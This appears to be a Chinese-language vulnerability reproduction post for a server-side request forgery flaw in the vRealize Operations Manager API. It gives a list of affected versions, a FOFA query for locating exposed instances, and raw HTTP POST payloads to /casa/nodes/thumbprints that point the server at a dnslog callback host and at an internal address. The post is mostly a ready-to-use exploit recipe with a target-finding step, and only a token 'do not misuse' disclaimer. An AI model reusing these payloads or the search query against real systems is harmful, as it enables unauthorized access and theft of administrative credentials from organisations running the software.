## **漏洞描述**

vRealize Operations Manager API包含服务器端请求伪造。可以通过网络访问vRealize Operations Manager
API的恶意攻击者可以执行服务器端请求伪造攻击(SSRF)，以窃取管理凭据。

##  **漏洞影响**

vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0

cloud_foundation: 4.x 3.x

vRealize_suite_lifecycle_manager: 8.x

##  **漏洞复现**

使用FOFA语句包含关键字查找FOFA语句（仅供学习参考，请勿非法利用）

> title="vRealize Operations Manager"

![1617194488_60646df84078c12182caa.png!small?1617194489381](https://image.3001.net/images/20210331/1617194488_60646df84078c12182caa.png!small?1617194489381)

访问登录页面如下

![1617194518_60646e16e3fceb20326b5.png!small?1617194520112](https://image.3001.net/images/20210331/1617194518_60646e16e3fceb20326b5.png!small?1617194520112)

  

发送请求包如下

    
    
    POST /casa/nodes/thumbprints HTTP/1.1Host: 127.0.0.1Content-Type: application/json;charset=UTF-8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Content-Length: 24["tw9ao5.dnslog.cn"]

![1617194752_60646f008e5a35b033b34.png!small?1617194753741](https://image.3001.net/images/20210331/1617194752_60646f008e5a35b033b34.png!small?1617194753741)

![1617194798_60646f2e51b4d01f36c50.png!small?1617194799593](https://image.3001.net/images/20210331/1617194798_60646f2e51b4d01f36c50.png!small?1617194799593)

>
>     POST /casa/nodes/thumbprints HTTP/1.1Host:127.0.0.1Content-Type:
> application/json;charset=UTF-8User-Agent: Mozilla/5.0 (Windows NT 10.0;
> Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114
> Safari/537.36Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.9Content-Length: 24["127.0.0.1:443/ui"]

  

![1617194959_60646fcfa5014fcfeb0f0.png!small?1617194960831](https://image.3001.net/images/20210331/1617194959_60646fcfa5014fcfeb0f0.png!small?1617194960831)

  

